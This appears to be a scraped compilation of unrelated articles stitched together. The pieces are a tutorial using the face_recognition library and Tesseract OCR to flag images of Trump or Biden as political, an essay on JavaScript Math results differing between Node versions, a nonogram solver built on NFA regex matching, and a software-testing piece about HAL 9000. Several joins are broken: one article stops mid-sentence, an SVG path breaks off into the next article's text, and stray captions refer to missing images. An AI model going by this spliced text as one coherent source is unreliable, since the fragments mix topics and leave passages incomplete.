<p>With the US election coming up, the amount of political media in my face has reached an all time high. In fact this is a common complaint I hear among people I talk to, even those not in the US. So I thought to myself what if there was a way to identify political media before I ever got to the content...Keep that thought in mind as you read through this post and think how you or someone else could use this technology. The below was an exploration for me in to the current state of open source facial and text recognition libraries and a look at just how crazy good they are.</p>
<p><small><em>* Note: The content that follows isn't meant to represent any political opinion, it's just simply used as sample content</em></small></p>
<h3>Finding Text on an Image</h3>
<p>Often times political media will simply just be a tweet or a tweet and a witty reply. This type of content is the perfect type of media for optical character recognition (OCR) due to the level of contrast between the background and the text. Based on my tests, <a href="https://cloud.google.com/vision/docs/ocr">Google Cloud</a> and <a href="https://docs.microsoft.com/en-us/azure/cognitive-services/computer-vision/concept-recognizing-text">Microsoft Azure</a> rule the closed source, proprietary world. However, the focus of this project will be strictly open source projects. Trying to find open source OCR software that isn't named <a href="https://github.com/tesseract-ocr/tesseract">Tesseract</a> is actually quite the challenge. It's been around since the late 80s/early 90s, was open sourced in 2005, and as of 2006 has been under active development by Google.</p>

<p>Overall not too bad. The important parts are that the text that has political context translated nicely. We'll see how we can use this to our advantage later.</p>
<h3>Recognizing Who a Person is in an Image</h3>
<p>I thought this would be the hardest part of the project. I thought I'd need tons of images of everyone I wanted to identify and would severely hamper the amount of people I could identify. Not to mention a lot of content doesn't have the person looking directly at the camera nor would anyone confuse the picture of being good quality. This is where the state of open source really surprised me. I originally started with <a href="https://github.com/justadudewhohacks/face-api.js/">Face API</a>, but wasn't able to get it to do exactly what I wanted. From there I turned my gaze to the language of machine learning, Python. I landed on <a href="https://github.com/ageitgey/face_recognition">Face Recognition</a> which had everything I needed, great examples, worked on Windows, and tons of info.</p>
<p>If you're curious about how the Face Recognition software works at a high level I highly recommend the <a href="https://medium.com/@ageitgey/machine-learning-is-fun-part-4-modern-face-recognition-with-deep-learning-c3cffc121d78">blog post</a> from the creator. The concepts behind it are also how Face API and many other facial recognition libraries work.</p>
<p>The cool part about all this is that you can take a single training image like this:</p>
<p><img src="https://i.ibb.co/VVRCx8g/Official-portrait-of-President-Donald-J-Trump-Friday-October-6-2017-Official-White-House-photo-by-Sh.jpg"></p><p>and come out with a model that can recognize Donald Trump like this:</p>
<p><a href="https://ibb.co/4VF1Bzw"><img src="https://i.ibb.co/Kr5KCdc/identifytrump.png" alt="identifytrump"></a></p><h3>Recognizing Text and People in Videos</h3>
<p>Understanding context in animated content is much harder than doing static images. However, the easiest way to solve a problem is to break it down in to smaller, more solvable problems. The way to do this with videos and GIFs is to think of what they really are. They're just static images played one after another at some specified rate. Thus, we can apply our same static image technique to a video or animated GIF and just repeat it multiple times. The downside is that we end up doing a lot of analysis on a video even if no new people or text make their way on to the screen for quite awhile. We'll look at some ways that we can speed this up later on. If you're not interested in the code you can <a href="#political-results">click here</a> to skip to the end results.</p>
<h3>Identifying if an Image is Political</h3>
<p>In order to simplify things we'll say that if an image contains Donald Trump or Joe Biden it is considered political. However, we could add any number of people to this algorithm and it would work just fine. If you want to increase the likelyhood of identifying a particular person you can load multiple images of them and just give them the same label in "known_face_names". A lot of the code is inspired by the examples from the <a href="https://github.com/ageitgey/face_recognition/tree/55b5c136292dcd4a1f5953f3eb3181235086efab/examples">Face Recognition examples</a> repos; I highly recommend checking out that section. To start with our example we'll use these 3 images:</p>
<p><a href="https://ibb.co/rx3CrTT"><img src="https://i.ibb.co/1rMDWhh/biden.jpg" width="230"></a> <a href="https://ibb.co/dBFptyP"><img src="https://i.ibb.co/VVRCx8g/Official-portrait-of-President-Donald-J-Trump-Friday-October-6-2017-Official-White-House-photo-by-Sh.jpg" width="230"></a> <a href="https://ibb.co/SJgRJ1r"><img src="https://i.ibb.co/25rg5LN/President-Barack-Obama-delivers-a-statement-to-the-press-on-the-economy-in-the-East-Room-of-the-Whit.jpg" width="230"></a></p>
<p>We'll recognize them using the Face Recognition library. To build encodings for each face in our known set we'll load the images locally</p>
<pre>biden_image = face_recognition.load_image_file('biden.jpg')
trump_image = face_recognition.load_image_file('trump.jpg')
unknown_image = face_recognition.load_image_file('obamabiden.jpg')

# Our known images only have one face so just grab the first index
biden_face_encoding = face_recognition.face_encodings(biden_image)[0]
trump_face_encoding = face_recognition.face_encodings(trump_image)[0]

known_face_encodings = [
    biden_face_encoding,
    trump_face_encoding
]

known_face_names = [
    'Biden',
    'Trump'
]
</pre>
<p>If you wanted to load it remotely you could use the following code:</p>
<pre>import io
import requests
from PIL import Image

url = requests.get(url)
img = Image.open(io.BytesIO(url.content))
</pre>
<p>From there we need to identify all the faces in our unknown image. Once we've identified all our faces we need to compare each one to the ones that we know about. If one looks similar to a known person then we'll mark the face as such. The tolerance level recommended by Face Recognition is 0.6 or less. As you get closer to 0 you're more likely to have found a match. This is how we'll do the matching:</p>
<pre>tolerance = 0.6

# Locate the faces in our unknown image
face_locations = face_recognition.face_locations(unknown_image)
face_encodings = face_recognition.face_encodings(unknown_image, face_locations)

# Try to identify each found face based on our list of known faces
for (top, right, bottom, left), face_encoding in zip(face_locations, face_encodings):
    name = 'Unknown'

    # Find the closest known match to our unknown face. 0 represents an exact match
    face_distances = face_recognition.face_distance(known_face_encodings, face_encoding)
    best_match_index = np.argmin(face_distances)
    if face_distances[best_match_index] &lt;= tolerance:
        name = known_face_names[best_match_index]
    print(name)
</pre>
<p>The above will tell us if we've found a known match or not. We can bring in PIL to draw our fancy boxes around each if desired. However, if we're just trying to find if something is political or not we can simply return after finding a face less than our tolerance without looking at every face. To show how to draw the boxes though our final code for facial recognition would look like this:</p>
<pre>import face_recognition
from PIL import Image, ImageDraw
import numpy as np

biden_image = face_recognition.load_image_file('biden.jpg')
trump_image = face_recognition.load_image_file('trump.jpg')
unknown_image = face_recognition.load_image_file('obamabiden.jpg')

# Our known images only have one face so just grab the first index
biden_face_encoding = face_recognition.face_encodings(biden_image)[0]
trump_face_encoding = face_recognition.face_encodings(trump_image)[0]

known_face_encodings = [
    biden_face_encoding,
    trump_face_encoding
]

known_face_names = [
    'Biden',
    'Trump'
]

tolerance = 0.6

# Locate the faces in our unknown image
face_locations = face_recognition.face_locations(unknown_image)
face_encodings = face_recognition.face_encodings(unknown_image, face_locations)

pil_image = Image.fromarray(unknown_image)
draw = ImageDraw.Draw(pil_image)

# Try to identify each found face based on our list of known faces
for (top, right, bottom, left), face_encoding in zip(face_locations, face_encodings):
    name = 'Unknown'

    # Find the closest known match to our unknown face. 0 represents an exact match
    face_distances = face_recognition.face_distance(known_face_encodings, face_encoding)
    best_match_index = np.argmin(face_distances)
    if face_distances[best_match_index] &lt;= tolerance:
        name = known_face_names[best_match_index]

    # Draw a box around the face using the Pillow module
    draw.rectangle(((left, top), (right, bottom)), outline=(0, 0, 255))

    # Draw a label with a name below the face
    text_width, text_height = draw.textsize(name)
    draw.rectangle(((left, bottom - text_height - 10), (right, bottom)), fill=(0, 0, 255), outline=(0, 0, 255))
    draw.text((left + 6, bottom - text_height - 5), name, fill=(255, 255, 255, 255))

# Display the resulting image
pil_image.show()    
</pre>
<p>The result is pretty cool. We're able to detect Biden among a large number if people and properly label everyone else as unknown.</p>
<p><a href="https://ibb.co/Kzd0jLv"><img src="https://i.ibb.co/4gzmZYr/obamabiden2.jpg" alt="obamabiden2"></a></p><p>To recognize text in our image we can use Tesseract to translate our image to text as shown earlier. To demo this we'll use the Mark Hamill tweet from earlier. The code for reading the text on an image is as follows:</p>
<pre>from PIL import Image
import pytesseract
import re

words = ['biden', 'trump']
regex = re.compile('|'.join(words), re.IGNORECASE)

text = pytesseract.image_to_string(Image.open('bidentext.jpg'))
is_political = bool(regex.search(text))
print(is_political)
</pre>
<p>The code above uses a simple algorithm to determine if the text in an image is political or not. We're simply using Tesseract to find all the text in the image and then searching that text for the string "biden" or "trump" in a case insensitive manner. From my experience trying to find context on shorter phrases such as a tweet is very challenging. If I was looking at this from a news article perspective I may have recommended a different approach. The main downside of the current text match is that we'd label this …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>This is a written version of a talk that I gave at <a href="https://wafflejs.com/">WaffleJS</a> in February, which itself was an expansion of a <a href="https://twitter.com/tmcw/status/1187782634623000576">Twitter conversation</a> from October.</em></p><p><picture><source srcset="https://macwright.com/images/2020-02-14-math-keeps-changing-math-education.webp" type="image/webp"><img alt="Math education" src="https://macwright.com/images/2020-02-14-math-keeps-changing-math-education.jpg"></picture></p><p>Okay, so it starts with my delayed math education. As part of my Computer Science program, I had access to world-class math professors, access that I mostly wasted. I didn’t like math: the topics were so removed from practice, and I was already frustrated by the highly theoretical, and – I thought at the time and mostly still do – out-of-touch CS program.</p><p>Unfortunately, a few years after graduating, I got the hunger for math. Seeing how I could apply just a little bit of math knowledge to great effect in my work &amp; hobbies had me inspired. But I had no clear way of learning it.</p><p>So I <a href="https://macwright.com/2012/06/26/simple-statistics.html">started Simple Statistics in 2012</a> as a way to learn math, and ever since then, I’ve expanded and maintained the project. It now includes a lot of different algorithms, is one of the most ‘starred’ JavaScript math projects, and presumably is used by people.</p><p>But I started it in 2012. In tech years that’s a really long time ago. Between then and now, there have been 8 LTS releases of <a href="https://nodejs.org/en/">Node</a>. JavaScript and its environments have radically changed. 2012 was before the introduction of React or the first commit to Babel.</p><p><picture><source srcset="https://macwright.com/images/2020-02-14-math-keeps-changing-time-passing.webp" type="image/webp"><img alt="Time passing" src="https://macwright.com/images/2020-02-14-math-keeps-changing-time-passing.jpg"></picture></p><p>So what I noticed over the years was that tests kept breaking when I updated Node. I’d have a test like:</p><div><div><pre><code><span>t</span><span>.</span><span>equal</span><span>(</span><span>ss</span><span>.</span><span>gamma</span><span>(</span><span>11.54</span><span>),</span> <span>13098426.039156161</span><span>);</span>
</code></pre></div></div><p>That would work in Node v10 and break in Node v12. And this is not some complex method: gamma is implemented with arithmetic, Math.pow, Math.sqrt, and Math.sin.</p><h3 id="arithmetic">Arithmetic</h3><p>So I know what you might be thinking: arithmetic. JavaScript, on Twitter, gets a lot of heat for this behavior:</p><div><div><pre><code>0.1 + 0.2 = 0.30000000000000004
</code></pre></div></div><p>As I wrote in <a href="https://macwright.com/2017/07/29/javascript-wats-dissected.html#numbers-are-weird">JavaScript wats, dissected</a>, this is the behavior of every popular programming language, even stodgy pedantic ones like Haskell. Floating point arithmetic might be weird, but it’s very consistent and well-specified: the <a href="https://en.wikipedia.org/wiki/IEEE_754">IEEE 754</a> specification is rigorously implemented. So it’s not arithmetic: addition, subtraction, division, and multiplication are pretty set in stone.</p><h3 id="math">Math</h3><p>What it was, was Math. In particular, all of <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Math">the methods that come after <code>Math.</code></a></p><p>Methods like Math.sin, Math.cos, Math.exp, Math.pow, Math.tan: <a href="https://macwright.com/2013/03/05/math-for-pictures.html">essential ingredients for geometry</a> and basic computation. I started isolating changes in basic function behavior between versions. For example:</p><p>Calculating Math.tanh(0.1)</p><div><div><pre><code>// Node 4
0.09966799462495590234
// Node 6
0.09966799462495581907
</code></pre></div></div><p>Calculating Math.pow(1/3, 3)</p><div><div><pre><code>// Node 10
0.03703703703703703498
// Node 12
0.03703703703703702804
</code></pre></div></div><p>To make matters worse, it’s not just Node’s behavior that’s changing: so are browsers and other places you use JavaScript.</p><p>So this led to the question: <strong>what is math?</strong></p><svg fill="none" viewBox="0 0 1105 572" width="100%" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h1105v572H0z" fill="#fff"></path><path d="M551.933 460.719c92.311 0

coordinates on the rim, and that they’ll draw little squigglies if plotted on X &amp; Y. Actually <em>deriving</em> those methods is what you’ll learn in advanced classes, but the method that you use - the <a href="https://en.wikipedia.org/wiki/Taylor_series">Taylor series</a> - relies on an <em>infinite</em> series, which would be rather laborious for a computer to solve.</p><blockquote><p>“There is no standard algorithm for calculating sine. IEEE 754-2008, the most widely used standard for floating-point computation, does not address calculating trigonometric functions such as sine.”</p></blockquote><p>-<a href="https://en.wikipedia.org/w/index.php?title=Sine&amp;oldid=939445047#Software_implementations">Wikipedia</a></p><p>Computers use a variety of different estimations and algorithms to do math, things like <a href="https://en.wikipedia.org/wiki/CORDIC">CORDIC</a> and various cheating algorithms and lookup tables. This heterogeny explains all of the <a href="https://github.com/search?q=fastmath">‘fastmath’</a> libraries you can find on GitHub: there’s more than one way to implement Math.sin. Famously, Quake III Arena used a <a href="https://en.wikipedia.org/w/index.php?title=Fast_inverse_square_root&amp;oldid=940101226">faster replacement for the inverse square root method</a> in order to speed up rendering.</p><p>So math is implemented as algorithms, and there are multiple common algorithms –&nbsp;and variations of those algorithms –&nbsp;used in practice.</p><p>Instead of telling implementations to pick an algorithm, the JavaScript specification grants them a <em>lot</em> of wiggle room in terms of how they implement these basic functions.</p><blockquote><p>The behaviour of the functions acos, acosh, asin, asinh, atan, atanh, atan2, cbrt, cos, cosh, exp, expm1, hypot, log,log1p, log2, log10, pow, random, sin, sinh, sqrt, tan, and tanh is not precisely specified here except to require specific results for certain argument values that represent boundary cases of interest.</p></blockquote><p>-<a href="https://www.ecma-international.org/ecma-262/10.0/index.html#sec-function-properties-of-the-math-object">ECMA-262, 10th edition, section 20.2.2 aka “JavaScript”</a></p><p>I don’t know the inner workings of the standards committees, but I imagine they wanted to make sure that just in case Intel or AMD introduce super-fast new math instructions in a new processor, JavaScript wouldn’t have a compatibility crisis.</p><p>Because there are a lot of JavaScript interpreters that are commonly used, because JavaScript is often used via web browsers and there still is some competition between web browsers, and because even popular JavaScript implementations are under pressure to evolve quickly to be the most performant…&nbsp;because of all that, this matters. You actually will encounter, on a regular basis, differences in math.</p><p>This doesn’t matter as much in other interpreted languages, because they tend to have ‘canonical’ interpreters: most of the time you use the Python interpreter of the Python language.</p><h3 id="where-math-happens">Where math happens</h3><p>Next let’s zoom into <em>where</em> these math implementations live. See, in JavaScript, there are three places where basic math can happen:</p><ol><li>The CPU</li><li>The language interpreter (the C++ and C code that underlies JavaScript implementations)</li><li>In software itself, as a library</li></ol><p><strong>1: The CPU</strong></p><p>This was my first guess: I assumed that since CPUs implement arithmetic, they might implement some higher-level math. It turns out that CPUs do have instructions to do trigonometry and other operations, but they’re rarely invoked. The CPU (x86) implementation of sine doesn’t get much love because it’s not reliably faster than an implementation in software (using arithmetic operations on the CPU), nor as accurate.</p><p>Intel also bears some blame for <a href="https://randomascii.wordpress.com/2014/10/09/intel-underestimates-error-bounds-by-1-3-quintillion/">overstating the accuracy of their trigonometric operations</a> by many magnitudes. That kind of mistake is especially tragic because, unlike software, you can’t patch chips.</p><p><strong>2: The language interpreter</strong></p><p>This is how most of the implementations do it, and they implement math in a variety of ways.</p><ul><li>V8 &amp; SpiderMonkey use (slightly different) ports of the <a href="http://www.netlib.org/fdlibm/">fdlibm</a> library for most operations. It has been passed down through the generations, originally written at Sun Microsystems.</li><li>JavaScriptCore (Safari) uses cmath for most operations.</li><li>Internet Explorer used some cmath, but <a href="https://github.com/microsoft/ChakraCore/blob/d86452259dd534718b7eb9ce024ed35aefd33036/lib/Runtime/Library/MathLibrary.cpp#L1028-L1047">also used some assembly instructions and actually <em>did</em> use CPU-provided trig methods</a> when it was compiled for CPUs that had them.</li></ul><p>Historically, all of these implementations have shifted: V8 used to use a homegrown solution for math, and then used <a href="https://github.com/v8/v8/blob/ff7975aa8d1ff6f0904f0f5112d17ea819466983/src/math.js">a port of fdlibm to JavaScript</a>, before finally settling on fdlibm in C.</p><h3 id="why-this-is-an-issue">Why this is an issue</h3><p>Here’s why this is a problem: it chips away at JavaScript’s ability to give consistent results to any problem including mathematics. And that especially hits <em>data science</em>. I want JavaScript to be a contender for data science in the browser, and – amongst some other issues, like number types and a confounding lack of a commonly-used data-frames library –&nbsp;an inability to produce replicable results means adding more crisis to the <a href="https://en.wikipedia.org/wiki/Replication_crisis">replication crisis</a> in the sciences.</p><h3 id="the-third-way">The third way</h3><p>There is a way out that we can use today. <a href="https://github.com/stdlib-js/stdlib">stdlib</a> is a JavaScript library that reimplements higher-level math using arithmetic alone. Arithmetic is fully-specified and standard, so the results that stdlib gives you are also fully consistent, across all the platforms.</p><p>This comes at the cost of complexity and speed: stdlib isn’t consistently as fast as built-in methods, and you’ll need to require a library ‘just’ to compute sine.</p><p>But in the wider view, this is pretty normal! WebAssembly, for example, doesn’t give you higher-level math methods at all and recommends you include a math implementation in your modules themselves:</p><blockquote><p>“WebAssembly doesn’t include its own math functions like sin, cos, exp, pow, and so on. WebAssembly’s strategy for such functions is to allow them to be implemented as library routines in WebAssembly itself (note that x86’s sin and cos instructions are slow and imprecise and are generally avoided these days anyway).”</p></blockquote><p>And this is the way that compiled languages have always worked: when you compile a C program, the methods you import from <code>math.h</code> are included in the compiled binary.</p><h3 id="using-an-epsilon">Using an epsilon</h3><p>If you don’t want to include stdlib to do math but you do want to test math-heavy code, you’ll probably have to do what simple-statistics does right now: use an epsilon. Of the <a href="https://en.wikipedia.org/w/index.php?title=Epsilon&amp;oldid=938802001#Symbol">5+ uses of epsilon in math</a>, the one I’m referring to is “an arbitrarily small positive quantity”. It’s a tiny number. Here’s <a href="https://github.com/simple-statistics/simple-statistics/blob/727eaed049af4f788fb2299e5c8263573618e78c/src/epsilon.js#L35">simple-statistics’s implementation</a>: the number 0.0001.</p><p>You then compare <code>Math.abs(result - expected) &lt; epsilon</code> to make sure you got within range of the desired value, with a little bit of wiggle room.</p><h3 id="the-moral-of-the-story">The moral of the story</h3><p>Here’s where I was a little short on time in person and have some room to expand.</p><p><em>First, what’s under the hood is rarely what you expect.</em> Our current tech stack is heavily optimized and a lot of optimizations are really just dirty tricks. For example, the number of hardware instructions it takes to solve <code>Math.sin</code> varies based on the input, because there are lots of special cases. When you get to more complex cases, like ‘sorting an array’, there are often multiple algorithms that the interpreter chooses between in order to give you your final result. Basically, the cost of anything you do in an interpreted language is variable.</p><p><em>Second, don’t trust the system too much.</em> What I was seeing between Node versions really <em>should</em> have been a bug in the testing library, or something in my code, or maybe in simple-statistics itself. But in this case, digging deeper revealed that what I was seeing was exactly what you don’t expect: a glitch in the language itself.</p></div></div>

        <p><em>I recently solved a particular kind of puzzle, nonograms, using finite state machines for regex matching. This is a very efficient way to do regex matching and in fact formed the basis of the first regex matchers. But finite state machines have since been replaced with more versatile but slower backtracking algorithms.</em></p>

<h2 id="introduction">Introduction</h2>

<p>I recently got hooked on a new type of puzzle, nonograms. Wikipedia has a great entry explaining them <a href="https://en.wikipedia.org/wiki/Nonogram">here</a>. Here is a small example:</p>

<figure>
<img src="https://liorsinai.github.io/assets/posts/nonograms/elephant_start.png" alt="nonogram elephant start">
</figure>

<p>Each puzzle consists of a grid with numbers along the rows and columns. These numbers indicate connected sets of shaded cells along that row/column, with an unknown amount of unshaded cells in between.
For example, the clue (4, 2) along row 2 means that in this row there are an unknown number of white cells, followed by 4 shaded cells, followed by one or more white cells,
followed by 2 shaded cells, and then another unknown number of white cells. The aim is to shade the cells so that all clues read correctly. 
Puzzles have the added bonus that they are often designed to result in a picture. For example, here is the unique solution to the above puzzle:</p>

<figure>
<img src="https://liorsinai.github.io/assets/posts/nonograms/elephant_finished.png" alt="nonogram elephant finished">
</figure>

<p>I wrote solvers for these puzzles in both <a href="https://github.com/LiorSinai/NonogramSolverCpp">C++</a> and <a href="https://github.com/LiorSinai/NonogramSolver">Python</a>. Of course, such a problem is already well investigated. 
See Jan Wolter’s <a href="https://webpbn.com/survey/">survey</a> of online solvers.
My solvers are actually rather slow compared to some of those. It takes more than a minute for some puzzles, where as Jan claims his own solver took a second.
See also <a href="https://rosettacode.org/wiki/Nonogram_solver">Rosetta code</a>’s collection of brute force solvers in many different languages. These solvers are slow but will always solve the puzzle.</p>

<p>This problem shares many characteristics with Sudoku, which I covered in a previous <a href="https://liorsinai.github.io/coding/2020/07/27/sudoku-solver.html">blog post</a>. 
Like Sudoku, the puzzle involves a grid and the general problem is NP complete.
Also like Sudoku, many puzzles are designed with the intention of having a unique solution, but there is no guarantee for this.
Lastly, the most efficient way to solve it is through constraint propagation, but if you get stuck guessing is the simplest way forward.</p>

<p>Unlike my Sudoku post, I am not going to fully describe the solvers here. Instead, I would like to concentrate on one particular aspect of the solver, pattern matching.
I think this is the most valuable part of the solver, because this technique is transferable to many other situations.</p>

<h2 id="how-to-solve-nonograms">How to solve nonograms</h2>

<p>A blank nonogram puzzle can be daunting. Thankfully there is a simple technique to get going.
For every row/column, construct the left-most/top-most solution. Then slide it across all the way to the right/bottom.
The cells that always remain part of the same sequence (whether black or white) can be shaded in.</p>

<p>For example, for the above nonogram:</p>
<figure>
<img src="https://liorsinai.github.io/assets/posts/nonograms/elephant_row6.png" alt="nonogram elephant solving">
</figure>
<p>Row 6 is the row of interest. Rows 5 and 7 show the left-most and right-most solutions respectively (and not solutions for row 5 or 7). 
The shaded cells in row 6 are the cells that always overlap in row 5 and row 7. These can be kept black, and all other cells should be left unknown.</p>

<p>This process is then completed for every row. Next, it is done for each column, except this time the solution is constrained by the cells already shaded in each row.
This process can then be repeated on each row with the new constraints. And so on. For many puzzles, the entire puzzle can be solved with this one technique alone.</p>

<p>Before continuing, I would like to showcase examples where this fails. The first is this aeroplane puzzle:</p>

<figure>
<img src="https://liorsinai.github.io/assets/posts/nonograms/aeroplane_solving.png" alt="aereoplane nonogram">
<figcaption> Left: left-right matcher solver stuck. Middle: extra solvable blocks. Right: complete solution. Source: <a href="https://www.youtube.com/watch?v=MZQDDzzRBvI">link.</a> </figcaption>
</figure>

<p>In the left image, the left-right matcher algorithm has got stuck.
But this puzzle can still be solved with other logic. 
Notably, two white blocks in the middle are always white regardless of which sequence the single blacks in the corresponding rows belong too.
This unlocks the rest of the puzzle.
It is not obvious - in fact in the source video, the guy resorts to guessing.</p>

<p>The next two puzzles are more challenging. Both consist of many small black runs with plenty of white space:</p>
<figure>
<img src="https://liorsinai.github.io/assets/posts/nonograms/smoke.png" alt="smoke nonogram">
<figcaption> Left: ""Where there's smoke...". Right: "Domino Logic III". Source: <a href="https://webpbn.com/survey/puzzles/">link</a>. </figcaption>
</figure>
<p>At first logic line solving will not get you anywhere with these puzzles. But a few guesses will unlock them.
A caveat though with “Domino Logic III”  - a string of bad guesses can lead down a seemingly never ending path of guesses.</p>

<figcaption> Source: <a href="https://stackoverflow.com/questions/813366/solving-nonograms-picross/813888">link.</a> </figcaption>
</figure>

<p>The trickiest part of the left-right algorithm is finding the left-most match.<sup id="fnref:0" role="doc-noteref"><a href="#fn:0">1</a></sup> 
For an empty puzzle, this is trivial. However as more cells are shaded and the puzzle gets larger,
this gets harder. See for example the above half finished puzzle (final <a href="https://liorsinai.github.io/assets/posts/nonograms/bear_finished.png">solution</a>).
The main difficulty comes from deciding whether to place a white or not. This binary choice leads to $\mathcal{O}(2^n)$ complexity.
I originally implemented a depth-first search (DFS) with backtracking, but for large puzzles (100x100) this was too slow.
This was especially crippling on puzzles which required guessing, which adds another layer of backtracking.</p>

<p>I tried coding other matching algorithms, but they always seemed to turn into DFS.
It is easy to write heuristics for simple cases, but the general case eluded me.
So I looked around for more efficient matching algorithms, and came across this often cited <a href="https://swtch.com/~rsc/regexp/regexp1.html">blog post</a> by Russ Cox. 
It describes Ken Thompson’s $\mathcal{O}(n^2)$ <a href="https://dl.acm.org/doi/10.1145/363347.363387">matching algorithm</a> for regex<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup> using nondeterministic finite state automata (NFA).</p>

<p>The nonogram problem here can easily be rephrased as a regex problem. This is done as follows:</p>
<ul>
  <li>Encode in binary:
    <ul>
      <li>black cell: $01_2 = 1$</li>
      <li>white cell: $10_2 = 2$</li>
      <li>either:     $11_2 = 3$</li>
    </ul>
  </li>
  <li>Write each nonogram pattern <em>(a, b, …, z)</em> as the following regex: <code>([23]*)([13]){a}([23]+)([13]){b}([23]+)...([13]){z}([23]*)</code>.</li>
</ul>

<p>Regex matchers themselves are usually DFS algorithms. For the most part this is more practical than finite state automata. 
DFS allows more complex regular expressions (Cox’s article has a full list in his post). 
However the exponential nature of backtracking can cause them to fail, sometimes in spectacular <a href="https://blog.cloudflare.com/details-of-the-cloudflare-outage-on-july-2-2019/">fashion</a>.</p>

<p>An alternative is to represent the character expression as a nondeterministic finite state automation. Let’s break that name down:</p>
<ul>
  <li>automation: a sort of machine/program. I find the term archaic but it does come from a time before computers.</li>
  <li>finite state: there is a countable number of states. This is opposed to infinite or continuous states, such as measurements with gradients in nature, or states which depend on such a large combination of elements that they are for practical purposes uncountable.</li>
  <li>nondeterministic: given a state, it cannot always be determined what the previous state was. Actually, that is a minor problem here because we do want to know how many times we have passed through each state, not just the current state. But we can store this information outside of the NFA.</li>
</ul>

<p>The NFA is composed of states <em>S</em> which transition in one of the following ways:</p>
<figure>
<img src="https://liorsinai.github.io/assets/posts/nonograms/symbols.png" alt="nfa symbols">
<figcaption> NFA graphic symbols and corresponding regex syntax </figcaption>
</figure>

<p>We can use these components to build up a full state automation for our regex pattern:</p>
<figure>
<img src="https://liorsinai.github.io/assets/posts/nonograms/nfa.png" alt="nfa">
</figure>
<p>We start at the start state <em>S</em>, and as we read characters, transition to the right. We only transition if the next character matches the next state.
If the next character doesn’t match any transition, then we halt the matching process.</p>

<p>If we were to backtrack on a halt, then this algorithm would still be an $\mathcal{O}(2^n)$ process.
It is made into an $O(n^2)$ algorithm by doing the following:</p>

<ol>
  <li>At each split with multiple valid transitions, simultaneously  do all.</li>
  <li>Only keep track of current active states (and not the history).</li>
</ol>

<p>Only doing the first would result in breadth-first search (BFS), which still has $O(2^n)$ complexity.
The second step however means that the number of active states per character is a function of the pattern length. That is $O(n)$.
So since we process $n$ characters,the whole algorithm is $O(n^2)$.</p>

<p>The minor difficulty is that we do want to keep track of part of the history - that is, the current matching vectors - as well as the current state.
But we can keep one match per state without increasing the complexity, and since we only want the left-most match, we can just keep the left-most match per state.</p>

<p>The first step is to compile the pattern to a finite state machine.
This is tricky because of potential nested expressions and also because of skipping states (e.g. with ? or *). 
The Thompson construction first converts the pattern to postfix notation. 
It then uses a stack to keep track of the start and end states. 
For my implementation here, I’ve stored all the states in the vector <em>states</em>, and the stack holds the indices of each state in that vector.
These indices are referred to as “state IDs” in the code.
Then depending on the input symbol, a different action is taken.</p>

        <blockquote><p>The pod bay doors didn’t open. Why didn’t someone test for that?</p></blockquote>
<p>One of the most famous bits of movie dialog, one that’s become part of popular culture, is in the film <a href="https://www.imdb.com/title/tt0062622/" target="_blank" rel="noopener noreferrer">2001: A Space Odyssey</a>. The protagonist, Dr. Dave Bowman, says to the voice-driven AI, “<a href="https://www.youtube.com/watch?v=dSIKBliboIo" target="_blank" rel="noopener noreferrer">Open the pod bay doors</a>, HAL.” To which HAL responds, “I’m sorry, Dave, I’m afraid I can’t do that.”</p>
<p>(<em>Spoilers abound. You’ve been warned.</em>)</p>
<p>Most people only pay attention to the story. But if you’re a software QA expert, what you heard was an obvious failure in software quality testing.</p>
<p>The AI should have obeyed the order immediately. But obviously, the HAL 9000 computer went off the rails. In the process, the computer killed all but one of the crew of Discovery, the space ship that HAL was operating, and it failed in its mission to discover more about a mysterious monolith. That qualifies as <a href="https://www.functionize.com/blog/from-the-qa-trenches-6-signs-of-project-success-or-failure/">a serious software failure</a> – though, happily, a fictional one; fortunately, in the real world, <a href="https://www.functionize.com/blog/how-nasa-does-software-testing-and-qa/">NASA does a better job</a>.</p>
<p>It’s equally obvious that thorough testing of the computer and its AI software had missed HAL’s homicidal bent.</p>
<p>If you accept the premise that HAL was a mission-critical application, then there are actual lessons one can learn about ensuring important software meets expectations – particularly in an environment with a lot of unknowns.</p>
<p>So what happened? One reason is that testing an AI is complex. It’s also likely that the makers of the HAL 9000 didn’t think testing was necessary. Why? <a href="https://www.youtube.com/watch?v=Be8Gbqdox68" target="_blank" rel="noopener noreferrer">Just ask HAL</a>. “The 9000 series is the most reliable computer ever made. No 9000 computer has ever made a mistake or distorted information,” HAL said as an introduction.</p>
<p><iframe title="2001 A Space Odyssey - Just The HAL 9000" width="500" height="281" src="https://www.youtube.com/embed/Be8Gbqdox68?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>
<p>HAL didn’t view its actions as a mistake. Its programming didn’t include sufficient safeguards to prevent things like, say, killing your passengers. This is clearly a programming failure, and while it’s unlikely that the programming would specifically allow such an action, such an error also must not have been seen as contrary to mission success.</p>
<p>However, there are also other issues. The HAL 9000 computer, and its AI software, clearly used machine learning to modify its programming. That meant that when news reached the computer about a potential alien civilization, the AI changed its programming to help achieve what it now viewed as mission success. But as in many cases of AI failures, it had insufficient data on which to base such a conclusion. Likewise, it had (and did not create) safeguards to prohibit some types of actions, regardless of what the machine learning indicated.</p>
<p>By now, science fiction fans are muttering about the “<a href="http://webhome.auburn.edu/~vestmon/robotics.html" target="_blank" rel="noopener noreferrer">Three Laws of Robotics</a>,” but those don’t apply in the universe where this movie happened. Those laws, governing how robots are to interact with humans, were invented by author Isaac Asimov, and were intended to prevent robots (or other AI devices) from hurting people. They may not have been part of Arthur C. Clarke’s <em>2001</em> premise. There is something to be said in favor of incorporating them into HAL’s programming, but if nothing else, that would have ruined the story.</p>
<h3>How not to test</h3>
<p>“If there’s one thing we’ve learned from HAL 9000 and other major software glitches in the automobile, health, and safety sectors, it is to improve testing procedures,” says Eric Carrell, a DevOps engineer at <a href="https://rapidapi.com/" target="_blank" rel="noopener noreferrer">RapidAPI</a>. “It may sound counter-intuitive, but the best way to minimize bugs in software is to make sure another machine is not doing the job.”</p>
<p>“Testing automation looks extremely profitable in terms of cost-effectiveness and high productivity levels for development teams,” Carrell explains. “However, the truth is that a machine can barely make sure that another machine can be passed as safe or complete.”</p>
